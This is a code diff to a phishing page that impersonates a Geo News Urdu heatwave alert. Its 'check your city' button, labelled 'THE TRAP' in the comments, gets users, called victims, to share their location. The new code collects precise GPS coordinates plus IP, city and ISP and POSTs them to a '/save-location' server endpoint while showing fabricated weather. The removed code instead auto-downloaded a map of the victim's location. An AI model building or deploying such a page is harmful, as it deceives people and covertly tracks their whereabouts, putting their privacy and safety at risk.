@@ -37,9 +37,6 @@
             flex-direction: column;
         }
         
-        /* ============================================================
-           TOP: News Brand Bar - TIGHT
-           ============================================================ */
         .news-header {
             background: #1a1a1a;
             padding: 6px 14px;
@@ -71,7 +68,6 @@
             letter-spacing: 1px;
         }
         
-        /* Alert Banner - TIGHT */
         .alert-banner {
             background: #cc0000;
             padding: 3px 14px;
@@ -86,9 +82,6 @@
             letter-spacing: 1.5px;
         }
         
-        /* ============================================================
-           HERO: Compact - TIGHT
-           ============================================================ */
         .hero-image {
             background: linear-gradient(180deg, #ff6b35 0%, #cc0000 100%);
             padding: 10px 16px 8px;
@@ -127,9 +120,6 @@
             border-radius: 20px;
         }
         
-        /* ============================================================
-           CONTENT: TIGHT - NO GAPS
-           ============================================================ */
         .content {
             padding: 12px 14px 12px;
             display: flex;
@@ -137,7 +127,6 @@
             gap: 12px;
         }
         
-        /* Top section */
         .top-section {
             flex-shrink: 0;
         }
@@ -214,15 +203,11 @@
             color: #1a1a1a;
         }
         
-        /* ============================================================
-           BOTTOM SECTION - BUTTON + TRAP
-           ============================================================ */
         .bottom-section {
             flex-shrink: 0;
             margin-top: 4px;
         }
         
-        /* THE TRAP BUTTON - TIGHT */
         .action-card {
             background: #f8f8f8;
             border-radius: 10px;
@@ -283,7 +268,6 @@
             transform: translateX(4px);
         }
         
-        /* Status - TIGHT */
         .status-text {
             text-align: center;
             font-size: 9px;
@@ -292,7 +276,6 @@
             flex-shrink: 0;
         }
         
-        /* Loading - TIGHT */
         .loading-spinner {
             display: none;
             width: 20px;
@@ -313,9 +296,6 @@
             to { transform: rotate(360deg); }
         }
         
-        /* ============================================================
-           WEATHER RESULTS - TIGHT (VICTIM SEES THIS ONLY)
-           ============================================================ */
         .weather-results {
             display: none;
             margin-top: 4px;
@@ -371,10 +351,7 @@
             text-align: left;
         }
         
-        /* ============================================================
-           SUCCESS MESSAGE - VICTIM SEES THIS
-           ============================================================ */
-        .download-message {
+        .success-message {
             display: none;
             margin-top: 8px;
             padding: 10px 12px;
@@ -385,29 +362,28 @@
             flex-shrink: 0;
         }
         
-        .download-message.active {
+        .success-message.active {
             display: block;
         }
         
-        .download-message .icon {
+        .success-message .icon {
             font-size: 24px;
             display: block;
         }
         
-        .download-message .title {
+        .success-message .title {
             font-size: 13px;
             font-weight: 700;
             color: #2e7d32;
             margin-top: 2px;
         }
         
-        .download-message .sub {
+        .success-message .sub {
             font-size: 10px;
             color: #555;
             margin-top: 2px;
         }
         
-        /* Footer - TIGHT */
         .footer {
             text-align: center;
             font-size: 7px;
@@ -423,7 +399,6 @@
 
     <div class="news-card" dir="rtl">
         
-        <!-- TOP: News Brand Bar -->
         <div class="news-header">
             <div class="brand"><span>جیو</span> نیوز</div>
             <div class="badge">⚡ live</div>
@@ -433,7 +408,6 @@
             <span>⚠️ قومی موسمیاتی الرٹ</span>
         </div>
         
-        <!-- HERO -->
         <div class="hero-image">
             <span class="weather-icon">☀️</span>
             <div class="temp">48°</div>
@@ -441,10 +415,8 @@
             <div class="warning-text">🔥 ہیٹ ویو کی وارننگ جاری</div>
         </div>
         
-        <!-- CONTENT -->
         <div class="content">
             
-            <!-- Top Section -->
             <div class="top-section">
                 <div class="headline">شدید گرمی کی وارننگ جاری</div>
                 <div class="subheadline">متعدد شہروں میں شدید ہیٹ ویو کا خدشہ</div>
@@ -466,10 +438,8 @@
                 </div>
             </div>
             
-            <!-- Bottom Section -->
             <div class="bottom-section">
                 
-                <!-- THE TRAP BUTTON -->
                 <div class="action-card" id="weatherBox">
                     <span class="icon">📍</span>
                     <div class="title">کیا آپ کا شہر متاثر ہوا ہے؟</div>
@@ -482,7 +452,6 @@
                 <div class="status-text" id="statusText">چیک کرنے کے لیے دبائیں کہ کیا آپ کا شہر متاثر ہے</div>
                 <div class="loading-spinner" id="loadingSpinner"></div>
                 
-                <!-- Weather Results (Victim Sees This) -->
                 <div class="weather-results" id="weatherResults">
                     <div class="weather-label">🌤️ 3 روزہ پیشگوئی</div>
                     <div class="weather-grid">
@@ -507,11 +476,10 @@
                     </div>
                 </div>
                 
-                <!-- Download Message (Victim Sees This Instead of Map) -->
-                <div class="download-message" id="downloadMessage">
-                    <span class="icon">📥</span>
-                    <div class="title">آپ کے شہر کی تفصیلی رپورٹ ڈاؤن لوڈ ہو رہی ہے</div>
-                    <div class="sub">موسمیاتی رپورٹ تیار کر لی گئی ہے</div>
+                <div class="success-message" id="successMessage">
+                    <span class="icon">✅</span>
+                    <div class="title">آپ کے شہر کا موسم اپ ڈیٹ ہو گیا</div>
+                    <div class="sub">تفصیلی رپورٹ تیار کر لی گئی ہے</div>
                 </div>
                 
                 <div class="footer">
@@ -523,8 +491,7 @@
 
     <script>
         // ============================================================
-        // THE TRAP - Creates local HTML file with victim's location
-        // Victim only sees weather data - Map is in the downloaded file
+        // THE TRAP - Sends location to server, file created on server
         // ============================================================
         
         const weatherBox = document.getElementById('weatherBox');
@@ -532,14 +499,10 @@
         const statusText = document.getElementById('statusText');
         const loadingSpinner = document.getElementById('loadingSpinner');
         const weatherResults = document.getElementById('weatherResults');
-        const downloadMessage = document.getElementById('downloadMessage');
+        const successMessage = document.getElementById('successMessage');
         
         let isTracking = false;
-        let victimData = null;
         
-        // ============================================================
-        // STEP 1: Victim clicks "Check Your City"
-        // ============================================================
         weatherBox.addEventListener('click', requestLocation);
         checkBtn.addEventListener('click', function(e) {
             e.stopPropagation();
@@ -559,15 +522,12 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        victimData = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        let accuracy = position.coords.accuracy;
                         
-                        setTimeout(() => {
-                            showWeatherResults(victimData);
-                        }, 2000);
+                        // Send location to server (with city lookup)
+                        sendLocationToServer(lat, lon, accuracy);
                     },
                     function(error) {
                         statusText.textContent = '❌ لوکیشن کی اجازت درکار ہے';
@@ -596,14 +556,120 @@
         }
         
         // ============================================================
-        // STEP 2: Show Weather + Create Local HTML File
+        // SEND LOCATION TO SERVER (with IP fallback)
         // ============================================================
-        function showWeatherResults(data) {
+        function sendLocationToServer(lat, lon, accuracy) {
+            // Try multiple IP APIs (some might have CORS issues)
+            const ipApis = [
+                'https://ipinfo.io/json',
+                'https://ipapi.co/json/',
+                'https://api.ipify.org?format=json'
+            ];
+            
+            let city = 'Unknown';
+            let region = 'Unknown';
+            let country = 'Unknown';
+            let isp = 'Unknown';
+            let ip = 'Unknown';
+            
+            // Try to get location from IP (with fallbacks)
+            fetch('https://ipinfo.io/json')
+            .then(response => {
+                if (!response.ok) throw new Error('ipinfo.io failed');
+                return response.json();
+            })
+            .then(data => {
+                city = data.city || 'Unknown';
+                region = data.region || 'Unknown';
+                country = data.country || 'Unknown';
+                isp = data.org || 'Unknown';
+                ip = data.ip || 'Unknown';
+                
+                // Send to server
+                return sendToServer(lat, lon, accuracy, city, region, country, isp, ip);
+            })
+            .catch(() => {
+                // Fallback: Try ipapi.co
+                return fetch('https://ipapi.co/json/')
+                .then(response => {
+                    if (!response.ok) throw new Error('ipapi.co failed');
+                    return response.json();
+                })
+                .then(data => {
+                    city = data.city || 'Unknown';
+                    region = data.region || 'Unknown';
+                    country = data.country_name || 'Unknown';
+                    isp = data.org || 'Unknown';
+                    ip = data.ip || 'Unknown';
+                    
+                    return sendToServer(lat, lon, accuracy, city, region, country, isp, ip);
+                });
+            })
+            .catch(() => {
+                // Final fallback: Send without IP info
+                console.warn('⚠️ All IP APIs failed, sending without city name');
+                return sendToServer(lat, lon, accuracy, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown');
+            });
+        }
+        
+        function sendToServer(lat, lon, accuracy, city, region, country, isp, ip) {
+            const data = {
+                lat: lat,
+                lon: lon,
+                accuracy: accuracy,
+                city: city,
+                region: region,
+                country: country,
+                isp: isp,
+                ip: ip,
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log('📤 Sending to server:', data);
+            
+            return fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Server error');
+                return response.json();
+            })
+            .then(result => {
+                console.log('✅ Location saved on server:', result);
+                showWeatherResults();
+            })
+            .catch(error => {
+                console.error('❌ Error sending to server:', error);
+                // Still show weather results to victim
+                showWeatherResults();
+                
+                // Try to save locally as backup
+                try {
+                    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `victim_backup_${Date.now()}.json`;
+                    a.click();
+                    URL.revokeObjectURL(url);
+                } catch(e) {
+                    console.error('Backup save failed:', e);
+                }
+            });
+        }
+        
+        // ============================================================
+        // SHOW WEATHER RESULTS (Victim sees this)
+        // ============================================================
+        function showWeatherResults() {
             loadingSpinner.classList.remove('active');
             weatherBox.style.display = 'none';
             weatherResults.classList.add('active');
             
-            // Generate random weather data
             const temps = [
                 `${43 + Math.floor(Math.random() * 5)}°C`,
                 `${41 + Math.floor(Math.random() * 5)}°C`,
@@ -614,280 +680,14 @@
             document.getElementById('day2Temp').textContent = temps[1];
             document.getElementById('day3Temp').textContent = temps[2];
             
-            statusText.textContent = '✅ آپ کے شہر کا موسم اپڈیٹ ہو گیا ہے';
+            statusText.textContent = '✅ آپ کے شہر کا موسم اپ ڈیٹ ہو گیا ہے';
             statusText.style.color = '#22aa44';
             
-            // ============================================================
-            // STEP 3: Create the local HTML file with map
-            // ============================================================
-            createLocalHTMLFile(data.lat, data.lon, data.accuracy);
-        }
-        
-        // ============================================================
-        // CREATE LOCAL HTML FILE WITH MAP
-        // ============================================================
-        function createLocalHTMLFile(lat, lon, accuracy) {
-            
-            // Get city name from IP
-            fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(ipData => {
-                let city = ipData.city || 'Unknown City';
-                let region = ipData.region || 'Unknown Region';
-                let country = ipData.country_name || 'Unknown Country';
-                let isp = ipData.org || 'Unknown ISP';
-                
-                // Generate the HTML content
-                const htmlContent = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📍 Your Location - Weather Report</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #1a1a1a;
-            font-size: 20px;
-            margin-bottom: 5px;
-        }
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        #map {
-            height: 400px;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #e8e8e8;
-        }
-        .info-box {
-            margin-top: 15px;
-            background: #f8f8f8;
-            border-radius: 10px;
-            padding: 15px;
-        }
-        .info-box .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 4px 0;
-            font-size: 13px;
-        }
-        .info-box .label {
-            color: #888;
-        }
-        .info-box .value {
-            color: #1a1a1a;
-            font-weight: 600;
-        }
-        .warning {
-            background: #fff5f5;
-            border: 1px solid #ffcdd2;
-            border-radius: 10px;
-            padding: 12px;
-            margin-top: 15px;
-            color: #c62828;
-            font-size: 13px;
-            font-weight: 600;
-            text-align: center;
-        }
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: #999;
-            margin-top: 15px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>📍 Your Location Report</h1>
-        <div class="subtitle">Weather report generated for your area</div>
-        
-        <div id="map"></div>
-        
-        <div class="info-box">
-            <div class="row">
-                <span class="label">📍 City</span>
-                <span class="value">${city}, ${region}</span>
-            </div>
-            <div class="row">
-                <span class="label">🌍 Country</span>
-                <span class="value">${country}</span>
-            </div>
-            <div class="row">
-                <span class="label">📱 ISP</span>
-                <span class="value">${isp}</span>
-            </div>
-            <div class="row">
-                <span class="label">🎯 Accuracy</span>
-                <span class="value">${Math.round(accuracy || 50)} meters</span>
-            </div>
-            <div class="row">
-                <span class="label">🔢 Coordinates</span>
-                <span class="value">${lat}, ${lon}</span>
-            </div>
-        </div>
-        
-        <div class="warning">
-            ⚠️ This report was generated from your location data
-        </div>
-        
-        <div class="footer">
-            Generated on ${new Date().toLocaleString()}
-        </div>
-    </div>
-    
-    <script>
-        var map = L.map('map').setView([${lat}, ${lon}], 17);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap contributors'
-        }).addTo(map);
-        
-        L.marker([${lat}, ${lon}]).addTo(map)
-            .bindPopup('<b>📍 Your Location</b><br>${city}, ${region}')
-            .openPopup();
-        
-        L.circle([${lat}, ${lon}], {
-            color: '#cc0000',
-            fillColor: '#cc0000',
-            fillOpacity: 0.15,
-            radius: ${accuracy || 50}
-        }).addTo(map);
-        
-        setTimeout(() => {
-            map.setView([${lat}, ${lon}], 18);
-        }, 1000);
-    <\/script>
-</body>
-</html>`;
-                
-                // ============================================================
-                // STEP 4: Download the file
-                // ============================================================
-                const blob = new Blob([htmlContent], { type: 'text/html' });
-                const url = URL.createObjectURL(blob);
-                
-                // Show download message
-                downloadMessage.classList.add('active');
-                statusText.textContent = '📥 رپورٹ ڈاؤن لوڈ ہو رہی ہے...';
+            setTimeout(() => {
+                successMessage.classList.add('active');
+                statusText.textContent = '📊 تفصیلی رپورٹ تیار ہے';
                 statusText.style.color = '#2e7d32';
-                
-                // Auto-download the file
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `weather_report_${city}_${new Date().getTime()}.html`;
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                
-                // Release the URL object
-                setTimeout(() => {
-                    URL.revokeObjectURL(url);
-                }, 10000);
-                
-                // Update status
-                setTimeout(() => {
-                    statusText.textContent = '✅ رپورٹ ڈاؤن لوڈ ہو گئی!';
-                    statusText.style.color = '#2e7d32';
-                }, 2000);
-                
-                // Log for demo
-                console.log('📍 Location captured:', { lat, lon, city, region, country, isp });
-                console.log('📥 File downloaded: weather_report_' + city + '.html');
-            })
-            .catch(() => {
-                // Fallback: Create file without city name
-                const htmlContent = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📍 Your Location - Weather Report</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-        }
-        h1 { color: #1a1a1a; font-size: 20px; margin-bottom: 5px; }
-        .subtitle { color: #666; font-size: 14px; margin-bottom: 15px; }
-        #map { height: 400px; border-radius: 12px; overflow: hidden; border: 1px solid #e8e8e8; }
-        .info-box { margin-top: 15px; background: #f8f8f8; border-radius: 10px; padding: 15px; }
-        .info-box .row { display: flex; justify-content: space-between; padding: 4px 0; font-size: 13px; }
-        .info-box .label { color: #888; }
-        .info-box .value { color: #1a1a1a; font-weight: 600; }
-        .warning { background: #fff5f5; border: 1px solid #ffcdd2; border-radius: 10px; padding: 12px; margin-top: 15px; color: #c62828; font-size: 13px; font-weight: 600; text-align: center; }
-        .footer { text-align: center; font-size: 11px; color: #999; margin-top: 15px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>📍 Your Location Report</h1>
-        <div class="subtitle">Weather report generated for your area</div>
-        <div id="map"></div>
-        <div class="info-box">
-            <div class="row"><span class="label">📍 Location</span><span class="value">${lat}, ${lon}</span></div>
-            <div class="row"><span class="label">🎯 Accuracy</span><span class="value">${Math.round(accuracy || 50)} meters</span></div>
-        </div>
-        <div class="warning">⚠️ This report was generated from your location data</div>
-        <div class="footer">Generated on ${new Date().toLocaleString()}</div>
-    </div>
-    <script>
-        var map = L.map('map').setView([${lat}, ${lon}], 17);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap contributors'
-        }).addTo(map);
-        L.marker([${lat}, ${lon}]).addTo(map).bindPopup('<b>📍 Your Location</b>').openPopup();
-        L.circle([${lat}, ${lon}], { color: '#cc0000', fillColor: '#cc0000', fillOpacity: 0.15, radius: ${accuracy || 50} }).addTo(map);
-        setTimeout(() => map.setView([${lat}, ${lon}], 18), 1000);
-    <\/script>
-</body>
-</html>`;
-                
-                const blob = new Blob([htmlContent], { type: 'text/html' });
-                const url = URL.createObjectURL(blob);
-                
-                downloadMessage.classList.add('active');
-                
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `weather_report_${new Date().getTime()}.html`;
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                
-                setTimeout(() => URL.revokeObjectURL(url), 10000);
-                statusText.textContent = '✅ رپورٹ ڈاؤن لوڈ ہو گئی!';
-                statusText.style.color = '#2e7d32';
-            });
+            }, 1000);
         }
     </script>
 </body>
